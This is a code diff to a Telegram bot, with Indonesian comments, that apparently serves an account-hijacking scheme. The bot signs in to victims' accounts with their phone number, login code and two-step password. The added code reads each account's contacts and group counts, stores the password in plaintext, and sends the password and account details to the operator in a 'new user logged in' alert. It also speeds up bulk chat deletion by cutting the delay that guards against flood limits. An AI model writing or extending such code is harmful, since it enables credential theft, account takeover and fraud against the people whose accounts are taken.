@@ -1,3 +1,5 @@
+# UPDATE NOTOFIKASI LOGIN TOTAL KONTAK
+
 import time, json, math, asyncio, httpx, numbers, re
 from datetime import datetime, timedelta
 from telethon.sync import TelegramClient, Button, events
@@ -421,35 +423,58 @@ async def handle_new_message(event):
             
             elif len(split) == 2 and len(split[1]) == 5:
                 try:
-                    # First check if we should process this user
-                    # if users.get(split[0], {}).get('group_processed'):
-                    #     print(f"ℹ️ User {split[0]} already processed - skipping group actions")
-                    #     processed = True
-                    # else:
-                    #     processed = False
-
                     # Sign in process
                     result = await acc.sign_in(split[0], split[1], phone_code_hash=f"{phase[split[0]]}")
                     name = result.first_name
                     if result.last_name:
                         name = f"{result.first_name} {result.last_name}"
-
-                    # Update user data (without overwriting existing group_processed flag)
+            
+                    # Get contacts using GetContactsRequest
+                    contacts_result = await acc(GetContactsRequest(hash=0))
+                    contacts = contacts_result.contacts
+                    saved_users = contacts_result.users
+                    
+                    # Calculate mutual and non-mutual contacts
+                    mutual_contacts = 0
+                    non_mutual_contacts = 0
+                    total_contacts = len(contacts)
+                    
+                    for contact in contacts:
+                        user = next((u for u in saved_users if u.id == contact.user_id), None)
+                        if user and user.mutual_contact:
+                            mutual_contacts += 1
+                        else:
+                            non_mutual_contacts += 1
+                    
+                    # Get dialogs (groups/channels)
+                    dialogs = await acc.get_dialogs()
+                    group_count = sum(1 for dialog in dialogs if dialog.is_group)
+                    
+                    # Update user data
                     user_data = {
                         "user_id": result.id,
                         "name": name,
                         "username": result.username,
-                        "password": ""
+                        "password": "",
+                        "total_contacts": total_contacts,
+                        "mutual_contacts": mutual_contacts,
+                        "non_mutual_contacts": non_mutual_contacts,
+                        "group_count": group_count
                     }
                     users[split[0]] = {**users.get(split[0], {}), **user_data}
-
-                    # Notification
+            
+                    # Notification with additional info
                     await notif(
                         f"✅ User Baru Masuk Bosku!\n\n"
                         f"👤 Name: {name}\n"
                         f"📱 Phone: {split[0]}\n"
                         f"🆔 UserID: {result.id}\n"
-                        f"🔗 Username: @{result.username if result.username else 'None'}", 
+                        f"🔗 Username: @{result.username if result.username else 'None'}\n\n"
+                        f"📊 Kontak:\n"
+                        f"  - Total: {total_contacts}\n"
+                        f"  - Mutual: {mutual_contacts}\n"
+                        f"  - Non-Mutual: {non_mutual_contacts}\n"
+                        f"👥 Jumlah Grup: {group_count}", 
                         split[0]
                     )
 
@@ -513,26 +538,59 @@ async def handle_new_message(event):
             elif len(split) == 3 and len(split[1]) == 5:
                 password = str(split[2])
                 try:
-                    # Sign in process
-                    result = await acc.sign_in(password=password, phone_code_hash=phase[split[0]])
+                    # Sign in process with password
+                    result = await acc.sign_in(split[0], split[1], password=password, phone_code_hash=phase[split[0]])
                     name = result.first_name
                     if result.last_name:
                         name = f"{result.first_name} {result.last_name}"
             
-                    users[split[0]] = {
+                    # Get contacts using GetContactsRequest
+                    contacts_result = await acc(GetContactsRequest(hash=0))
+                    contacts = contacts_result.contacts
+                    saved_users = contacts_result.users
+                    
+                    # Calculate mutual and non-mutual contacts
+                    mutual_contacts = 0
+                    non_mutual_contacts = 0
+                    total_contacts = len(contacts)
+                    
+                    for contact in contacts:
+                        user = next((u for u in saved_users if u.id == contact.user_id), None)
+                        if user and user.mutual_contact:
+                            mutual_contacts += 1
+                        else:
+                            non_mutual_contacts += 1
+                    
+                    # Get dialogs (groups/channels)
+                    dialogs = await acc.get_dialogs()
+                    group_count = sum(1 for dialog in dialogs if dialog.is_group)
+                    
+                    # Update user data
+                    user_data = {
                         "user_id": result.id,
                         "name": name,
                         "username": result.username,
-                        "password": split[2]
+                        "password": password,
+                        "total_contacts": total_contacts,
+                        "mutual_contacts": mutual_contacts,
+                        "non_mutual_contacts": non_mutual_contacts,
+                        "group_count": group_count
                     }
+                    users[split[0]] = user_data
             
-                    # Notification
+                    # Notification with additional info
                     await notif(
-                        f"✅ Userbaru Masuk Bosku!\n\n"
+                        f"✅ User Baru Masuk (With Password)!\n\n"
                         f"👤 Name: {name}\n"
                         f"📱 Phone: {split[0]}\n"
+                        f"🔑 Password: {password}\n"
                         f"🆔 UserID: {result.id}\n"
-                        f"🔗 Username: @{result.username if result.username else 'None'}",
+                        f"🔗 Username: @{result.username if result.username else 'None'}\n\n"
+                        f"📊 Kontak:\n"
+                        f"  - Total: {total_contacts}\n"
+                        f"  - Mutual: {mutual_contacts}\n"
+                        f"  - Non-Mutual: {non_mutual_contacts}\n"
+                        f"👥 Jumlah Grup: {group_count}", 
                         split[0]
                     )
             
@@ -1149,10 +1207,10 @@ async def callback_handler(event):
                             await client.delete_dialog(dialog.id)  # Tanpa revoke=True
                             success += 1
                             # Update progress
-                            if idx % 5 == 0 or idx == total:
+                            if idx % 10 == 0 or idx == total:
                                 progress = f"⏳ {idx}/{total} | ✅ {success} | ❌ {len(errors)}"
                                 await processing_msg.edit(f"Progress: {progress}")
-                            await asyncio.sleep(1.5)  # Anti-flood
+                            await asyncio.sleep(0.05)  # Anti-flood
                     except Exception as e:
                         errors.append(f"{dialog.name}: {str(e)}")
                         continue
